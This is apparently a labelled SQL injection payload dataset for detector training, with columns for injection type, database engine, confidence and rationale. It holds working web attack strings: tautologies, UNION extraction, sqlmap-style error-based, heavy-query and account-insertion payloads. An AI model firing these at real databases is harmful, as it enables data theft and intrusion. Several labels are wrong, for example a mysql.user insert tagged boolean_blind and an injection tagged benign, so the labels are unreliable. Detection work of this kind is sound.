id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,boolean_blind,mssql,0.85,Schema enumeration using 'sysobjects' indicates blind extraction attempt.,3
2,\x27UNION SELECT,union_based,generic,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,1
3,char@39A+@SELECT,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
4,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",boolean_blind,generic,0.85,Boolean comparison 'and 1 = 0' used for data inference,2
5,truncate,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
6,"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",boolean_blind,generic,0.85,Boolean comparison 'or 1 = 1' used for data inference,3
7,"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",boolean_blind,generic,0.85,Boolean comparison 'or 1 = 1' used for data inference,3
8,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )",boolean_blind,mysql,0.85,Accessing 'mysql.user' table is a strong indicator of an attempt to extract sensitive credentials.,3
9,exec sp,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
10,1;SELECT *,stacked_queries,generic,0.85,Stacked command 'select' following semicolon ';' detected,1
11,procedure,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
12,\'; desc users; --,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
13,1 uni on select all from where,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
14,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",union_based,generic,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,3
15,"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",boolean_blind,generic,0.85,Boolean comparison 'or 1 = 1' used for data inference,3
16,sqlvuln;,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
17,( select top 1,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
18,"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",union_based,generic,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,3
19,declare @s varchar ( 22 ) select @s =,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
20,"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",union_based,generic,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,3
21,@variable,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
22,"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",boolean_blind,generic,0.85,Boolean comparison 'or 1 = 1' used for data inference,3
23,"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",boolean_blind,generic,0.85,Boolean comparison 'or 1 = 1' used for data inference,3
24,replace,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
25,* ( | ( objectclass = * ) ),benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
26,limit,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
27,# from wapiti,boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
28,"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
29,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
30,"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",error_based,oracle,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
31,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
